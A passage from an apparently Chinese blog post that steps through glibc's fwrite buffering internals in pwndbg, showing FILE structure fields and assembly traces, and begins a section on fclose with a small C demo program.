dword ptr [rbp]            EAX, [0x5555555592a0] =&gt; 0xfbad2484</span><br><span class="line">0x7ffff7c8cf67 &lt;_IO_file_overflow+423&gt;    movq   xmm0, rdx                       XMM0 =&gt; 0x5555555594b0 ◂— 0</span><br><span class="line">0x7ffff7c8cf6c &lt;_IO_file_overflow+428&gt;    mov    qword ptr [rbp + 0x18], rdx     [0x5555555592b8] &lt;= 0x5555555594b0 ◂— 0</span><br><span class="line">0x7ffff7c8cf70 &lt;_IO_file_overflow+432&gt;    punpcklqdq xmm0, xmm0</span><br><span class="line">0x7ffff7c8cf74 &lt;_IO_file_overflow+436&gt;    movups xmmword ptr [rbp + 8], xmm0</span><br><span class="line">0x7ffff7c8cf78 &lt;_IO_file_overflow+440&gt;    jmp    _IO_file_overflow+125       &lt;_IO_file_overflow+125&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *_IO_list_all</span><br><span class="line">$2 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539004,</span><br><span class="line">    _IO_read_ptr = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_read_end = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_read_base = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_write_base = 0x0,</span><br><span class="line">    _IO_write_ptr = 0x0,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_buf_end = 0x55555555a4b0 &quot;&quot;,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = 3,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = -1,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到都设置为了<code>_IO_buf_base</code><br>后续再判断<code>_flags</code>位<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8ce3d &lt;_IO_file_overflow+125&gt;    test   ah, 1                           0x24 &amp; 0x1     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8ce40 &lt;_IO_file_overflow+128&gt;  ✘ jne    _IO_file_overflow+448       &lt;_IO_file_overflow+448&gt;</span><br></pre></td></tr></table></figure><p>如果是用户提供的缓冲区则跳转到<code>_IO_file_overflow+448</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x00007ffff7c8cf80 &lt;+448&gt;:   mov    r12,QWORD PTR [rbp+0x10]</span><br><span class="line">0x00007ffff7c8cf84 &lt;+452&gt;:   mov    rdi,rbp</span><br><span class="line">0x00007ffff7c8cf87 &lt;+455&gt;:   sub    r12,rdx</span><br><span class="line">0x00007ffff7c8cf8a &lt;+458&gt;:   call   0x7ffff7c8d7c0 &lt;__GI__IO_free_backup_area&gt;</span><br></pre></td></tr></table></figure><p>这里是调用函数清理backup区域。显然这里的缓冲区并不是用户提供的，而是malloc分配的，所以不会跳转<br>后续则是<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8ce46 &lt;_IO_file_overflow+134&gt;    mov    rsi, qword ptr [rbp + 0x40]     RSI, [0x5555555592e0] =&gt; 0x55555555a4b0 ◂— 0</span><br><span class="line">0x7ffff7c8ce4a &lt;_IO_file_overflow+138&gt;    cmp    rsi, rdx                        0x55555555a4b0 - 0x5555555594b0     EFLAGS =&gt; 0x206 [ cf PF af zf sf IF df of ac ]</span><br><span class="line">0x7ffff7c8ce4d &lt;_IO_file_overflow+141&gt;  ✘ je     _IO_file_overflow+352       &lt;_IO_file_overflow+352&gt;</span><br></pre></td></tr></table></figure><p>验证<code>_IO_buf_end</code>是否等于<code>_IO_buf_base</code>,确保缓冲区的分配<br>接着往下走<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8ce53 &lt;_IO_file_overflow+147&gt;    mov    rcx, qword ptr [rbp + 0x10]     RCX, [0x5555555592b0] =&gt; 0x5555555594b0 ◂— 0</span><br><span class="line">0x7ffff7c8ce57 &lt;_IO_file_overflow+151&gt;    mov    qword ptr [rbp + 8], rcx        [0x5555555592a8] &lt;= 0x5555555594b0 ◂— 0</span><br><span class="line">0x7ffff7c8ce5b &lt;_IO_file_overflow+155&gt;    mov    qword ptr [rbp + 0x18], rcx     [0x5555555592b8] &lt;= 0x5555555594b0 ◂— 0</span><br><span class="line">0x7ffff7c8ce5f &lt;_IO_file_overflow+159&gt;    mov    ecx, eax                        ECX =&gt; 0xfbad2484</span><br><span class="line">0x7ffff7c8ce61 &lt;_IO_file_overflow+161&gt;    or     ch, 8                           CH =&gt; 44 (0x24 | 0x8)</span><br><span class="line">0x7ffff7c8ce64 &lt;_IO_file_overflow+164&gt;    mov    qword ptr [rbp + 0x30], rsi     [0x5555555592d0] &lt;= 0x55555555a4b0 ◂— 0</span><br><span class="line">0x7ffff7c8ce68 &lt;_IO_file_overflow+168&gt;    mov    rsi, rdx                        RSI =&gt; 0x5555555594b0 ◂— 0</span><br></pre></td></tr></table></figure><p>这里<code>rcx</code>是<code>[rbp + 0x10]</code>也就是<code>_IO_read_end</code>，将其赋给<code>_IO_read_ptr</code>和<code>_IO_read_base</code>. <code>rsi</code>是<code>_IO_buf_end</code>，这里也就是把<code>_IO_write_end</code>设置成了<code>_IO_buf_end</code>，<code>rdx</code>是<code>_IO_buf_base</code>，再往下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8ce6b &lt;_IO_file_overflow+171&gt;:   mov    DWORD PTR [rbp+0x0],ecx</span><br><span class="line">0x7ffff7c8ce6e &lt;_IO_file_overflow+174&gt;:   mov    ecx,DWORD PTR [rbp+0xc0]</span><br><span class="line">0x7ffff7c8ce74 &lt;_IO_file_overflow+180&gt;:   mov    QWORD PTR [rbp+0x28],rdx</span><br><span class="line">0x7ffff7c8ce78 &lt;_IO_file_overflow+184&gt;    mov    qword ptr [rbp + 0x20], rdx     [0x5555555592c0] &lt;= 0x5555555594b0 ◂— 0</span><br></pre></td></tr></table></figure><p>这里设置<code>_flags</code>，然后保存<code>_mode</code>到ecx（<code>[rbp+0xc0]</code>即偏移0xc0是<code>_mode</code>域），然后将<code>_IO_write_base</code>和<code>_IO_write_ptr</code>设置为<code>_IO_buf_base</code><br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *_IO_list_all</span><br><span class="line">$4 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72536956,</span><br><span class="line">    _IO_read_ptr = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_read_end = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_read_base = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_write_base = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_write_ptr = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_write_end = 0x55555555a4b0 &quot;&quot;,</span><br><span class="line">    _IO_buf_base = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_buf_end = 0x55555555a4b0 &quot;&quot;,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = 3,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = -1,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到确实设置好了<br>接着往下走</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8ce7c &lt;_IO_file_overflow+188&gt;    test   ecx, ecx                        0xffffffff &amp; 0xffffffff     EFLAGS =&gt; 0x286 [ cf PF af zf SF IF df of ac ]</span><br><span class="line">0x7ffff7c8ce7e &lt;_IO_file_overflow+190&gt;  ✘ jg     _IO_file_overflow+45        &lt;_IO_file_overflow+45&gt;</span><br><span class="line"></span><br><span class="line">0x7ffff7c8ce84 &lt;_IO_file_overflow+196&gt;    test   eax, 0x202                      0xfbad2484 &amp; 0x202     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8ce89 &lt;_IO_file_overflow+201&gt;  ✔ je     _IO_file_overflow+45        &lt;_IO_file_overflow+45&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7c8cded &lt;_IO_file_overflow+45&gt;     cmp    ebx, -1                         0xffffffff - -0x1     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8cdf0 &lt;_IO_file_overflow+48&gt;   ✔ je     _IO_file_overflow+220       &lt;_IO_file_overflow+220&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7c8ce9c &lt;_IO_file_overflow+220&gt;    pop    rbx          RBX =&gt; 32</span><br><span class="line">0x7ffff7c8ce9d &lt;_IO_file_overflow+221&gt;    mov    rdi, rbp     RDI =&gt; 0x5555555592a0 ◂— 0xfbad2c84</span><br><span class="line">0x7ffff7c8cea0 &lt;_IO_file_overflow+224&gt;    sub    rdx, rsi     RDX =&gt; 0 (0x5555555594b0 - 0x5555555594b0)</span><br><span class="line">0x7ffff7c8cea3 &lt;_IO_file_overflow+227&gt;    pop    rbp          RBP =&gt; 0x5555555592a0</span><br><span class="line">0x7ffff7c8cea4 &lt;_IO_file_overflow+228&gt;    pop    r12          R12 =&gt; 0xd68</span><br><span class="line">0x7ffff7c8cea6 &lt;_IO_file_overflow+230&gt;    jmp    _IO_do_write                &lt;_IO_do_write&gt;</span><br></pre></td></tr></table></figure><p>先检查<code>ecx</code>也就是<code>_mode</code>是否大于0（是否被设置为了某种读写模式），这里我们<code>_mode</code>是-1，所以不跳转，然后再判断<code>_flags</code>的状态（<code>0x200</code> &#x3D; <code>_IO_NO_WRITES</code>，<code>0x2</code> &#x3D; <code>_IO_CURRENTLY_PUTTING</code>，je判断，意味着当前不是正在输出，也没禁止写入），跳转到<code>&lt;_IO_file_overflow+45&gt;</code>，判断确定可以写入之后，调用<code>_IO_do_write</code>函数来系统调用<code>write</code>输出<code>fp-&gt;_IO_write_ptr</code>到<code>fp-&gt;_IO_write_base</code>之间的内容，输出完后刷新缓冲区指针<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8c930 &lt;_IO_do_write&gt;             endbr64</span><br><span class="line">0x7ffff7c8c934 &lt;_IO_do_write+4&gt;           xor    eax, eax     EAX =&gt; 0</span><br><span class="line">0x7ffff7c8c936 &lt;_IO_do_write+6&gt;           test   rdx, rdx     0 &amp; 0     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8c939 &lt;_IO_do_write+9&gt;         ✘ jne    _IO_do_write+16             &lt;_IO_do_write+16&gt;</span><br><span class="line"></span><br><span class="line">0x7ffff7c8c93b &lt;_IO_do_write+11&gt;          ret                                &lt;_IO_file_xsputn+213&gt;</span><br></pre></td></tr></table></figure><p>我们此时<code>_IO_write_ptr</code> &#x3D;&#x3D; <code>_IO_write_base</code>，不需要输出，缓冲区也不需要刷新，故而<code>_IO_do_write</code>提前返回，再接着往下<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8b6de &lt;_IO_file_xsputn+222&gt;    mov    rcx, qword ptr [rbp + 0x40]     RCX, [0x5555555592e0] =&gt; 0x55555555a4b0 ◂— 0</span><br><span class="line">0x7ffff7c8b6e2 &lt;_IO_file_xsputn+226&gt;    sub    rcx, qword ptr [rbp + 0x38]     RCX =&gt; 0x1000 (0x55555555a4b0 - 0x5555555594b0)</span><br><span class="line">0x7ffff7c8b6e6 &lt;_IO_file_xsputn+230&gt;    mov    r8, r15                         R8 =&gt; 0x20</span><br><span class="line">0x7ffff7c8b6e9 &lt;_IO_file_xsputn+233&gt;    cmp    rcx, 0x7f                       0x1000 - 0x7f     EFLAGS =&gt; 0x216 [ cf PF AF zf sf IF df of ac ]</span><br><span class="line">0x7ffff7c8b6ed &lt;_IO_file_xsputn+237&gt;  ✘ jbe    _IO_file_xsputn+250         &lt;_IO_file_xsputn+250&gt;</span><br></pre></td></tr></table></figure><p>然后计算<code>_IO_buf_end</code> - <code>_IO_buf_base</code>，其大于0x7f，继续往下<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8b6ef &lt;_IO_file_xsputn+239&gt;    mov    rax, r15      RAX =&gt; 0x20</span><br><span class="line">0x7ffff7c8b6f2 &lt;_IO_file_xsputn+242&gt;    xor    edx, edx      EDX =&gt; 0</span><br><span class="line">0x7ffff7c8b6f4 &lt;_IO_file_xsputn+244&gt;    div    rcx</span><br><span class="line">0x7ffff7c8b6f7 &lt;_IO_file_xsputn+247&gt;:   sub    r8,rdx</span><br><span class="line">0x7ffff7c8b6fa &lt;_IO_file_xsputn+250&gt;    test   r8, r8     0 &amp; 0     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8b6fd &lt;_IO_file_xsputn+253&gt;  ✘ jne    _IO_file_xsputn+336         &lt;_IO_file_xsputn+336&gt;</span><br><span class="line"></span><br><span class="line">0x7ffff7c8b6ff &lt;_IO_file_xsputn+255&gt;    mov    r12, rbx     R12 =&gt; 0x20</span><br><span class="line">0x7ffff7c8b702 &lt;_IO_file_xsputn+258&gt;    test   r15, r15     0x20 &amp; 0x20     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ac ]</span><br><span class="line">0x7ffff7c8b705 &lt;_IO_file_xsputn+261&gt;  ✘ je     _IO_file_xsputn+110         &lt;_IO_file_xsputn+110&gt;</span><br><span class="line"></span><br><span class="line">0x7ffff7c8b70b &lt;_IO_file_xsputn+267&gt;    lea    rsi, [r13 + r8]     RSI =&gt; 0x555555559480 ◂— &#x27;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&#x27;</span><br><span class="line">0x7ffff7c8b710 &lt;_IO_file_xsputn+272&gt;    mov    rdx, r15            RDX =&gt; 0x20</span><br><span class="line">0x7ffff7c8b713 &lt;_IO_file_xsputn+275&gt;    mov    rdi, rbp            RDI =&gt; 0x5555555592a0 ◂— 0xfbad2c84</span><br><span class="line">0x7ffff7c8b716 &lt;_IO_file_xsputn+278&gt;    call   _IO_default_xsputn          &lt;_IO_default_xsputn&gt;</span><br></pre></td></tr></table></figure><p>这里<code>div rcx</code>，也就是将0x20除以0x1000的余数0x20存储到了<code>rdx</code>，经过一系列判断后调用<code>_IO_default_xsputn</code>函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8ddc4 &lt;_IO_default_xsputn+4&gt;     test   rdx, rdx     0x20 &amp; 0x20     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ac ]</span><br><span class="line">0x7ffff7c8ddc7 &lt;_IO_default_xsputn+7&gt;   ✘ je     _IO_default_xsputn+480      &lt;_IO_default_xsputn+480&gt;</span><br></pre></td></tr></table></figure><p>仍然是检查写入量不为0，后续一些列判断后调用了<code>__mempcpy_avx_unaligned_erms</code>函数（mempcpy函数的优化实现）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">► 0x7ffff7da0780 &lt;__mempcpy_avx_unaligned_erms&gt;       endbr64</span><br></pre></td></tr></table></figure><p>将数据写入缓冲区中<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *_IO_list_all</span><br><span class="line">$2 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72536956,</span><br><span class="line">    _IO_read_ptr = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_read_end = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_read_base = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_write_base = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_write_ptr = 0x5555555594d0 &quot;&quot;,</span><br><span class="line">    _IO_write_end = 0x55555555a4b0 &quot;&quot;,</span><br><span class="line">    _IO_buf_base = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_buf_end = 0x55555555a4b0 &quot;&quot;,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = 3,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = -1,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>_IO_write_ptr</code>正好是移动了0x20，再看缓冲区<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/8gx 0x5555555594a0</span><br><span class="line">0x5555555594a0: 0x0000000000000000      0x0000000000001011</span><br><span class="line">0x5555555594b0: 0x7777777777777777      0x7777777777777777</span><br><span class="line">0x5555555594c0: 0x7777777777777777      0x7777777777777777</span><br><span class="line">0x5555555594d0: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>可以看到数据已经读入<br>程序结束后，我们打开测试文件看到数据已经写入到了文件中<br>笔者就产生了疑惑：这里并没有系统调用write函数，数据只是进入了缓冲区，是如何写入文件的呢？不急，在本博客0x06部分再分析。<br>我们先总结一下fwrite的流程：<br><strong>首先判断输出缓冲区还有多少剩余，如果有剩余则将目标输出数据拷贝到输出缓冲区，如果输出缓冲区没有剩余（输出缓冲区未建立也是没有剩余）或输出缓冲区不够则调用<code>_IO_OVERFLOW</code>建立输出缓冲区或刷新输出缓冲区。输出缓冲区刷新后判断剩余的目标输出数据是否超过块的size（0x1000），如果超过块的size，则不通过输出缓冲区直接以块为单位，使用sys_write输出大块的目标数据到目标文件。余下或者小于块size的数据（我们这里0x20的数据便是这一行列）则调用<code>_IO_default_xsputn</code>将数据拷贝到输出缓冲区</strong>。<br></p><h2 id="0x05-fclose函数"><a href="#0x05-fclose函数" class="headerlink" title="0x05 fclose函数"></a>0x05 fclose函数</h2><p>还是这个demo，加个fclose函数<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    FILE*fp = fopen(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="type">char</span> *ptr = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr,<span class="string">&quot;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&quot;</span>,<span class="number">0x20</span>);</span><br><span class="line">    fwrite(ptr, <span class="number">1</span>, <span class="number">0x20</span>, fp);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在fclose下个断点，开始调试<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; 